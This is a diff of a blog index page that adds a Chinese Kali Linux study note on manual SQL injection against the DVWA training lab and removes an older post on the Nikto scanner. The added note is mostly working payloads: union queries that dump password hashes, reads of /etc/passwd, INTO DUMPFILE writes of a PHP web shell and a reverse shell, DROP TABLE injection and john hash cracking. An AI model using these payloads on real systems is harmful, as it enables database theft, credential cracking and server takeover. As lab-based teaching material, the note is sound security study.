@@ -240,6 +240,342 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/14/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E4%B9%9D)%EF%BC%9A%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98--SQL%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/01/14/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E4%B9%9D)%EF%BC%9A%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98--SQL%E6%B3%A8%E5%85%A5/" itemprop="url">Kali Linux笔记(四十九)：手动漏洞挖掘--SQL注入</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-14T20:11:22+08:00">
+                2020-01-14
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  1.6k 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  8 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-五种判断机制"><a href="#1-五种判断机制" class="headerlink" title="1. 五种判断机制"></a>1. 五种判断机制</h4><ul>
+<li>服务器端程序将用户输入参数作为查询条件，直接拼接SQL语句，并将查询结果返回给客户端浏览器（数据库调用或系统调用）</li>
+<li>用户登录判断<ul>
+<li>SELECT * FROM users WHERE user=’uname’ AND password=’password’</li>
+<li>SELECT * FROM users WHERE user=’uname’ AND password=”OR”=”</li>
+</ul>
+</li>
+<li>基于报错的检测方法（low）<ul>
+<li>‘ “ % ()</li>
+</ul>
+</li>
+<li>基于布尔的检测<ul>
+<li>1’ and ‘1’=’1 / 1’ and ‘1（真）</li>
+<li>1’ and ‘1’=’2 / 1’ and ‘0（假）</li>
+</ul>
+</li>
+<li>表列数/显示信息位于哪一列<ul>
+<li>‘order by 9–+（按查询列号排序）（注释符：–）</li>
+<li>select * 时表字段数=查询字段数</li>
+</ul>
+</li>
+<li>联合查询<ul>
+<li>‘union select 1,2–+ </li>
+<li>‘union all select database()/user()/version(),2– +</li>
+</ul>
+</li>
+<li>‘union select database(),substring index(USER(),”@”,1)–+（切分字段）</li>
+<li>DB用户：user() </li>
+<li>DB版本：version()</li>
+<li>全局函数：@@datadir、@@hostname、@@VERSION、@@version_compile_os</li>
+<li>当前库：database()</li>
+<li>ASCII转字符：char()</li>
+<li>连接字符串：CONCAT_WS(CHAR(32,58,32),user(),database(),version())</li>
+<li>计算哈希：md5()</li>
+<li>Mysql数据结构<ul>
+<li>information_schema</li>
+</ul>
+</li>
+<li>所有库所有表/统计每库中表的数量<ul>
+<li>‘union select table_name,table_schema from information_schema.tables–+</li>
+<li>‘union select table_schema,count(*) from information_schema.tables group by table_schema–+</li>
+</ul>
+</li>
+<li>Dvwa库中的表名<ul>
+<li>‘union select table_name,table_schema from information_schema.tables where table_schema=’dvwa’–+</li>
+</ul>
+</li>
+<li>Users表中的所有列（user_id,first_name,last_name,user,password,avatar）<ul>
+<li>‘union select table_name,column_name from information_schema.columns where table_schema=’dvwa’ and table_name=’users’–+</li>
+</ul>
+</li>
+<li>查询user、password列的内容<ul>
+<li>‘union select users,password from dvwa,users–+</li>
+<li>‘union select users,password from users–+</li>
+<li>‘union select null,concat(user,0x3a,password) from users–+ </li>
+</ul>
+</li>
+</ul>
+<h4 id="2-密码猜测"><a href="#2-密码猜测" class="headerlink" title="2. 密码猜测"></a>2. 密码猜测</h4><ul>
+<li>hash-identifier<ul>
+<li>输入猜测的值</li>
+</ul>
+</li>
+<li>密码破解<ul>
+<li>username:passhash–&gt;dvwa.txt</li>
+<li><strong><code>🔺命令：john --format=raw-MD5 dvwa.txt</code></strong>（存在./john文件）</li>
+</ul>
+</li>
+<li>显示之前破解的密码<ul>
+<li><strong><code>🔺命令：john --format=raw-MD5 dvwa.txt --show</code></strong></li>
+</ul>
+</li>
+</ul>
+<h4 id="3-系统文件读取-命令执行"><a href="#3-系统文件读取-命令执行" class="headerlink" title="3. 系统文件读取/命令执行"></a>3. 系统文件读取/命令执行</h4><ul>
+<li>读取文件<ul>
+<li>‘union select null,load_file(‘/etc/passwd’)–+</li>
+</ul>
+</li>
+<li>写入文件（原文件形式）<ul>
+<li>‘union select null,”<?php passthru($_GET['cmd']);?>“INTO DUMPFILE “a.php”–+（dumpfile到默认目录，默认目录只有mysql有权限）</li>
+<li>‘union select null,”<?php passthru($_GET['cmd']);?>“INTO DUMPFILE “/var/www/a.php”–+（dumpfile到指定目录）</li>
+<li><ul>
+<li>▲ 脚本可以写到具有777权限的/tmp目录，结合SQL注入和File Inclusion达到作用</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>写入文件（十六进制模式）<ul>
+<li><strong><code>🔺命令：cp /usr/share/webshells/php/php-reverse-shell.php ./b.php</code></strong></li>
+<li><strong><code>🔺命令：cat php-reverse-shell.php | xxd -ps | tr -d &#39;\n&#39;</code></strong>（▲ 十六进制编码的shell）</li>
+<li>‘union select null,+(0x十六进制编码) INTO DUMPFILE ‘/tmp/x.php’–+</li>
+<li>可能受到服务器GET大小的限制，传输不成功</li>
+</ul>
+</li>
+<li>保存下载数据库<ul>
+<li>‘union select null,concat(user,0x3a,password) from users INTO OUTFILE ‘/tmp/a.db’–+</li>
+</ul>
+</li>
+<li>一个思路：编写服务器端代码</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; union select null,&apos;&lt;?php if(isset($_POST[&quot;submit&quot;])) &#123; $userID = $_POST[&quot;userID&quot;]; $first_name = $_POST[&quot;first_name&quot;]; $last_name = $_POST[&quot;last_name&quot;]; $username = $_POST[&quot;username&quot;]; $avatar = $_POST[&quot;avatar&quot;]; echo &quot;userID: $userID&lt;BR&gt;&quot;; echo &quot;first_name: $first_name&lt;BR&gt;&quot;; echo &quot;last_name: $last_name&lt;BR&gt;&quot;; echo &quot;username: $username&lt;BR&gt;&quot;; echo &quot;avatar: $avatar&lt;BR&gt;&quot;; $con=mysqli_connect(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;&quot;,&quot;dvwa&quot;); if (mysqli_connect_errno()) &#123; echo &quot;Failed to connect to MySQL: &quot; . mysqli_connect_error(); &#125; else &#123; echo &quot;Connected to database&lt;BR&gt;&quot;; &#125; $password = &quot;123&quot;; $sql=&quot;insert into dvwa.users values (\\&quot;$userID\\&quot;,\ \&quot;$first_name\\&quot;,\\&quot;$last_name\\&quot;,\\&quot;$username\\&quot;,MD5(\\&quot;$password\\&quot;),\\&quot;$avatar\ \&quot;)&quot;; if (mysqli_query($con,$sql)) &#123; echo &quot;[Successful Insertion]: $sql&quot;; &#125; else &#123; echo &quot;Error creating database: &quot; . mysqli_error($con); &#125; mysqli_close($con); &#125; ?&gt; &lt;form method=&quot;post&quot; action=&quot;&lt;?php echo $_SERVER[&quot;PHP_SELF&quot;]; ?&gt;&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;userID&quot; value=&quot;33&quot;&gt;&lt;br&gt; &lt;input type=&quot;text&quot; name=&quot;first_name&quot; value=&quot;fh&quot;&gt;&lt;br&gt; &lt;input type=&quot;text&quot; name=&quot;last_name&quot; value=&quot;y&quot;&gt;&lt;br&gt; &lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;yfh&quot;&gt;&lt;br&gt; &lt;input type=&quot;text&quot; name=&quot;avatar&quot; value=&quot;yfh!&quot;&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit Form&quot;&gt;&lt;br&gt; &lt;/form&gt;&apos; INTO DUMPFILE &apos;/tmp/user.php&apos; --</span><br></pre></td></tr></table></figure>
+
+<h4 id="4-猜字段–无information-schema"><a href="#4-猜字段–无information-schema" class="headerlink" title="4. 猜字段–无information_schema"></a>4. 猜字段–无information_schema</h4><ul>
+<li>无权读取information_schema库/拒绝union、order by语句<ul>
+<li>猜列名：’and column is null–+（Burpsuite自动猜列名）</li>
+<li>猜当前表表名：’and table.user is null–+</li>
+<li>猜库里其他表：’and (select count(*) from table)&gt;0–+</li>
+<li>列表对应关系：’and users.user is null–+</li>
+<li>猜字段内容：’or user=’admin/‘or user like ‘%a%</li>
+<li>猜账号对应密码：’or user=’admin’ and password=’5f4dcc3b5aa765d61d8327deb832cf99（MD5值）</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<pre><code>⭐之前的SQL注入教程，主要是针对mysql的root权限，如果得到的是mysql的一个普通用户的权限，则很难通过information_schema来查询以及执行指令
+⭐查找column字典
+find / -name *column*.txt
+cat /usr/share/golismero/tools/sqlmap/txt/common-colums.txt | gerp -v ^# &gt; column.txt
+⭐查找table表名
+find / -name *.table*.txt
+cat /usr/share/golismero/tools/sqlmap/txt/common-table.txt | gerp -v ^# &gt;table.txt
+⭐MD5作为字典
+md5sum common-password.txt password.txt</code></pre></blockquote>
+<h4 id="5-用户注入–无information-schema"><a href="#5-用户注入–无information-schema" class="headerlink" title="5. 用户注入–无information_schema"></a>5. 用户注入–无information_schema</h4><ul>
+<li>‘;update users set user=’yuanfh’ where user=’admin’<ul>
+<li>注入失败，sql客户端工具的问题</li>
+<li><a href="http://dev.mysql.com/doc/refman/5.7/en/commands-out-of-sync.html" target="_blank" rel="noopener">http://dev.mysql.com/doc/refman/5.7/en/commands-out-of-sync.html</a></li>
+</ul>
+</li>
+<li>‘;INSERT into users(‘user_id’,’first_name’,’last_name’,’user’,’password’,’avatar’)VALUES(‘35’,’fh’,’yuan’,’yfh’,’5f4dcc3b5aa765d61d8327deb882cf99’,’OK’);–+</li>
+<li>‘;DROP TABLE users;–+</li>
+<li>xp_cmdshell /存储过程</li>
+<li>▲ SQLi没有通用的方法，掌握原理，了解各种数据库特性 </li>
+</ul>
+<h4 id="6-DVWA的SQL注入源码"><a href="#6-DVWA的SQL注入源码" class="headerlink" title="6. DVWA的SQL注入源码"></a>6. DVWA的SQL注入源码</h4><ul>
+<li>Dvwa的SQL Injection Source（Low）</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php    </span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;Submit&apos;]))&#123;</span><br><span class="line">    </span><br><span class="line">    // Retrieve data</span><br><span class="line">    </span><br><span class="line">    $id = $_GET[&apos;id&apos;];</span><br><span class="line"></span><br><span class="line">    $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos;&quot;;</span><br><span class="line">    $result = mysql_query($getid) or die(&apos;&lt;pre&gt;&apos; . mysql_error() . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line"></span><br><span class="line">    $num = mysql_numrows($result);</span><br><span class="line"></span><br><span class="line">    $i = 0;</span><br><span class="line"></span><br><span class="line">    while ($i &lt; $num) &#123;</span><br><span class="line"></span><br><span class="line">        $first = mysql_result($result,$i,&quot;first_name&quot;);</span><br><span class="line">        $last = mysql_result($result,$i,&quot;last_name&quot;);</span><br><span class="line">        </span><br><span class="line">        echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">        echo &apos;ID: &apos; . $id . &apos;&lt;br&gt;First name: &apos; . $first . &apos;&lt;br&gt;Surname: &apos; . $last;</span><br><span class="line">        echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line"></span><br><span class="line">        $i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Dvwa的SQL Injection Source（Medium）<ul>
+<li>对特殊字符的转义</li>
+<li>mysql_real_escape_srting()（PHP 4 &gt;=4.3.0，PHP5）</li>
+<li>PHP 5.5.0已经启用此函数</li>
+<li>PHP 7.0.0已经删除此函数，代之以MySQLi、PDO_M有、SQL</li>
+<li>转义字符（\x00、\n、\r、’、”、\x1a）</li>
+<li>▲ 绕过方法：不需要单引号，不需要–，直接插入语句即可</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&apos;Submit&apos;])) &#123;</span><br><span class="line"></span><br><span class="line">    // Retrieve data</span><br><span class="line"></span><br><span class="line">    $id = $_GET[&apos;id&apos;];</span><br><span class="line">    $id = mysql_real_escape_string($id);</span><br><span class="line"></span><br><span class="line">    $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id&quot;;</span><br><span class="line"></span><br><span class="line">    $result = mysql_query($getid) or die(&apos;&lt;pre&gt;&apos; . mysql_error() . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line">    </span><br><span class="line">    $num = mysql_numrows($result);</span><br><span class="line"></span><br><span class="line">    $i=0;</span><br><span class="line"></span><br><span class="line">    while ($i &lt; $num) &#123;</span><br><span class="line"></span><br><span class="line">        $first = mysql_result($result,$i,&quot;first_name&quot;);</span><br><span class="line">        $last = mysql_result($result,$i,&quot;last_name&quot;);</span><br><span class="line">        </span><br><span class="line">        echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">        echo &apos;ID: &apos; . $id . &apos;&lt;br&gt;First name: &apos; . $first . &apos;&lt;br&gt;Surname: &apos; . $last;</span><br><span class="line">        echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line"></span><br><span class="line">        $i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Dvwa的SQL Injection Source（High）<ul>
+<li>stripslashes（去除”&quot;）</li>
+<li>mysql_real_escape_string</li>
+<li>▲ is_numric（判断是否为数字）</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php    </span><br><span class="line">if (isset($_GET[&apos;Submit&apos;])) &#123;</span><br><span class="line"></span><br><span class="line">    // Retrieve data</span><br><span class="line"></span><br><span class="line">    $id = $_GET[&apos;id&apos;];</span><br><span class="line">    $id = stripslashes($id);</span><br><span class="line">    $id = mysql_real_escape_string($id);</span><br><span class="line"></span><br><span class="line">    if (is_numeric($id))&#123;</span><br><span class="line"></span><br><span class="line">        $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos;&quot;;</span><br><span class="line">        $result = mysql_query($getid) or die(&apos;&lt;pre&gt;&apos; . mysql_error() . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line"></span><br><span class="line">        $num = mysql_numrows($result);</span><br><span class="line"></span><br><span class="line">        $i=0;</span><br><span class="line"></span><br><span class="line">        while ($i &lt; $num) &#123;</span><br><span class="line"></span><br><span class="line">            $first = mysql_result($result,$i,&quot;first_name&quot;);</span><br><span class="line">            $last = mysql_result($result,$i,&quot;last_name&quot;);</span><br><span class="line">            </span><br><span class="line">            echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">            echo &apos;ID: &apos; . $id . &apos;&lt;br&gt;First name: &apos; . $first . &apos;&lt;br&gt;Surname: &apos; . $last;</span><br><span class="line">            echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line"></span><br><span class="line">            $i++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/08/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E4%BA%94)%EF%BC%9A%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98--%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E3%80%81SessionID%E3%80%81%E5%AF%86%E7%A0%81%E6%89%BE%E5%9B%9E%E3%80%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2945,252 +3281,6 @@ https流量劫持（在Network中间）：
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/27/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%89%E5%8D%81%E4%B8%83)%EF%BC%9ANikto/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/12/27/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%89%E5%8D%81%E4%B8%83)%EF%BC%9ANikto/" itemprop="url">Kali Linux笔记(三十七)：Nikto</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-27T10:59:15+08:00">
-                2019-12-27
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kali/" itemprop="url" rel="index">
-                    <span itemprop="name">Kali</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  902 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  3 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h4 id="1-NIKTO"><a href="#1-NIKTO" class="headerlink" title="1. NIKTO"></a>1. NIKTO</h4><ul>
-<li>Perl语言开发的开源web安全扫描器</li>
-<li>扫描软件版本</li>
-<li>扫描搜索存在安全隐患的文件（压缩包留下的未压缩文件）</li>
-<li>扫描服务器配置漏洞（默认配置文件存在的漏洞）</li>
-<li>WEB Application层面的安全隐患</li>
-<li>避免404误判<ul>
-<li>很多服务器不遵守RFC标准，对于不存在的对象返回200响应码</li>
-<li>依据响应文件内容判断，不同扩展名的文件404响应内容不同</li>
-<li>去除时间信息后的内容取MD5值哈希摘要（对于404响应内容）</li>
-<li>-no404（每次扫描前不会尝试扩展名的判断，考虑性能可使用）</li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>改进后的NIKTO：在扫描之前，会从软件数据库中，提取各自扩展名组成随机页面请求，判断是否存在，然后根据不存在的页面去除时间信息后的静态内容取MD5哈希摘要，作为扫描结果404的比对，来进行一定程度的规避404的误判，提高扫描准确性</code></pre></blockquote>
-<h4 id="2-NIKTO"><a href="#2-NIKTO" class="headerlink" title="2. NIKTO"></a>2. NIKTO</h4><ul>
-<li><strong><code>🔺命令：nikto -list -plugins</code></strong>（插件列表）</li>
-<li><strong><code>🔺命令：nikto -update</code></strong>▲ 2020.2.7 git clone <a href="https://github.com/sullo/nikto.git" target="_blank" rel="noopener">https://github.com/sullo/nikto.git</a> Nikto2/git pull去完成更新<ul>
-<li>cirt.net</li>
-<li><a href="http://cirt.net/nikto/UPDATES" target="_blank" rel="noopener">http://cirt.net/nikto/UPDATES</a></li>
-<li>Plugins：shellshock（破壳漏洞注意）</li>
-</ul>
-</li>
-<li><strong><code>🔺命令：nikto -host http://1.1.1.1 -output</code></strong></li>
-<li><strong><code>🔺命令：nikto -host 192.168.1.1 -ssl -port 443,8443,995</code></strong></li>
-<li><strong><code>🔺命令：nikto -host host.txt</code></strong>（一行表示一个要扫描的主机）</li>
-<li><strong><code>🔺命令：nmap -p80 192.168.1.0/24 -oG（grep输出）-（输出结果）| nikto -host - ▲ 2019.12.23</code></strong> 语句通过管道连接报错，单独语句可以执行</li>
-<li><strong><code>🔺命令：nikto -host 192.168.1.1 -userproxy</code></strong> <a href="http://localhost:22716（本机代理）" target="_blank" rel="noopener">http://localhost:22716（本机代理）</a></li>
-<li>-vhost（虚拟主机，一个IP多个主机，通过主机头判断，扫描需要域名，不可IP地址）</li>
-</ul>
-<h4 id="3-NIKTO–interactive（扫描过程的交互，停止可以再次按命令）"><a href="#3-NIKTO–interactive（扫描过程的交互，停止可以再次按命令）" class="headerlink" title="3. NIKTO–interactive（扫描过程的交互，停止可以再次按命令）"></a>3. NIKTO–interactive（扫描过程的交互，停止可以再次按命令）</h4><ul>
-<li>Space–report current scan status（报告当前扫描状态）</li>
-<li>v–verbose mode on/off（显示详细信息）</li>
-<li>d–debug mode on/off（最详细信息，调试信息，发送的http请求）</li>
-<li>e–error reporting on/off（错误报告显示）</li>
-<li>p–progress reporting on/off（进程信息显示）</li>
-<li>r–redirect display on/off（重定向显示）</li>
-<li>c–cookie display on/off（服务器所给的cookie显示）</li>
-<li>a–auth display on/off（身份认证过程显示）</li>
-<li>q–quit（退出扫描）</li>
-<li>N–next host（下一个主机）</li>
-<li>P–Pauser（暂停扫描）</li>
-</ul>
-<blockquote>
-<pre><code>NIKTO不支持表单账号密码身份认证，只支持https身份认证（id+，id:pass:realm），但可以通过设置指定Cookie进行扫描Web Applicattion，需要设置配置文件</code></pre></blockquote>
-<h4 id="4-NIKTO-配置"><a href="#4-NIKTO-配置" class="headerlink" title="4. NIKTO 配置"></a>4. NIKTO 配置</h4><ul>
-<li>默认配置文件（/etc/nikto.conf）</li>
-<li>需要注意的参数<ul>
-<li>USERAGENT（客户端代理，默认设置Nikto/@VERSION）</li>
-<li>RFIURL（远程文件包含默认文件，可自己修建自己的URL）</li>
-<li>CIRT（默认更新的IP地址）</li>
-<li>PROXYHOST/PROXYPORT/PROXYUSER/PROXYPASS（代理，可以修改代理）</li>
-<li>STATIC-COOKIE=”cookie1”=”cookie value”;”cookie2”=”cooke val”（设置cookie）</li>
-</ul>
-</li>
-<li>-evasion：使用LibWhisker对IDS的躲避技术，可使用以下几种类型（可指定多种）：<ul>
-<li>Random URL encoding(non-UTF8)–随机URL编码（非UTF-8方式 ）</li>
-<li>Directory self-reference(/./)–自选择路径（/./）</li>
-<li>Premature URL ending– 过早结束的URL</li>
-<li>Prepend long random string–优先考虑长随机字符串</li>
-<li>Fake parameter–参数欺骗</li>
-<li>TAB as request space–使用TAB作为命令的分隔符</li>
-<li>Change the case of the URL–使用变化的URL</li>
-<li>Use Windows directory separator()–使用Windows路径分隔符”&quot;</li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>Cookie获取：
-Firefox浏览器，可以通过Firbug option网络抓包，Net，然后Cookie，可通过d-debug mod查看设置的cookie是否生效
-User Agent：
-Firefox的默认UserAgent：Default User Agent → Default User Agent（每个浏览器可以进行独立设置）</code></pre></blockquote>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -3245,7 +3335,7 @@ Firefox的默认UserAgent：Default User Agent → Default User Agent（每个�
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">172</span>
+                  <span class="site-state-item-count">173</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -3352,7 +3442,7 @@ Firefox的默认UserAgent：Default User Agent → Default User Agent（每个�
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">171.9k</span>
+    <span title="Site words total count">172.8k</span>
   
 </div>
 
